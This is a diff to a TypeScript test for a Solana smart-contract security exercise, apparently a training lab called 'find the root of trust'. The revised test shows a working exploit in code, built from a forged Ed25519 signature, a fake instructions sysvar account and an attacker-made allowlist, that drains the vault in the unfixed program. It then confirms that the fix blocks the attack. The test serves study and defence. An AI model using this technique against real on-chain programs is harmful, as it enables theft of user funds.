@@ -64,19 +64,30 @@ describe("02-find-the-root-of-trust", () => {
     );
   });
 
-  it("exploit test: rejects a withdrawal using a fake instructions account (shows hole closed)", async () => {
+  it("shows the hole before the fix: withdrawal passes with a fake sysvar account and a fake allowlist", async () => {
     const fakeOracle = Keypair.generate();
     const amount = oneToken().muln(100);
 
+    // 1. Create a fake allowlist with the attacker's fake oracle key
+    const fakeAllowlist = Keypair.generate();
+    const allowlistIx = await env.program.methods
+      .createAllowlist([fakeOracle.publicKey])
+      .accountsPartial({
+        authority: env.payer.publicKey,
+        allowlist: fakeAllowlist.publicKey,
+      })
+      .instruction();
+    await sendIxs(env.context, [env.payer, fakeAllowlist], allowlistIx);
+
+    // 2. Synthesize an Ed25519 signature from the fake oracle
     const ed25519Ix = Ed25519Program.createInstructionWithPrivateKey({
       privateKey: fakeOracle.secretKey,
       message: withdrawalMessage(env.vault, env.payerTokens, amount),
     });
 
+    // 3. Synthesize a fake instructions sysvar account containing the forged Ed25519 payload
     const fakeSysvarData = buildFakeInstructionsSysvar(ed25519Ix.data);
     const fakeSysvar = Keypair.generate();
-
-    // Inject fake instructions sysvar account into the bankrun context
     env.context.setAccount(fakeSysvar.publicKey, {
       lamports: 1_000_000_000,
       data: fakeSysvarData,
@@ -85,12 +96,15 @@ describe("02-find-the-root-of-trust", () => {
       rentEpoch: 0,
     });
 
-    // Before fix, passing fakeSysvar would drain the vault.
-    // After fix, the program verifies instructions account == sysvar::instructions::ID and fails.
+    // 4. In the unfixed program, passing fakeSysvar and fakeAllowlist drains the vault.
+    // In the fixed program, this fails because:
+    // - instructions account address is validated to equal sysvar::instructions::ID
+    // - the allowed keys are read from the config PDA, not caller's allowlist
     const ix = await env.program.methods
       .withdraw(amount)
       .accountsPartial({
         caller: env.payer.publicKey,
+        allowlist: fakeAllowlist.publicKey,
         mint: env.mint,
         recipientTokens: env.payerTokens,
         instructions: fakeSysvar.publicKey,
@@ -143,4 +157,3 @@ describe("02-find-the-root-of-trust", () => {
     );
   });
 });
-
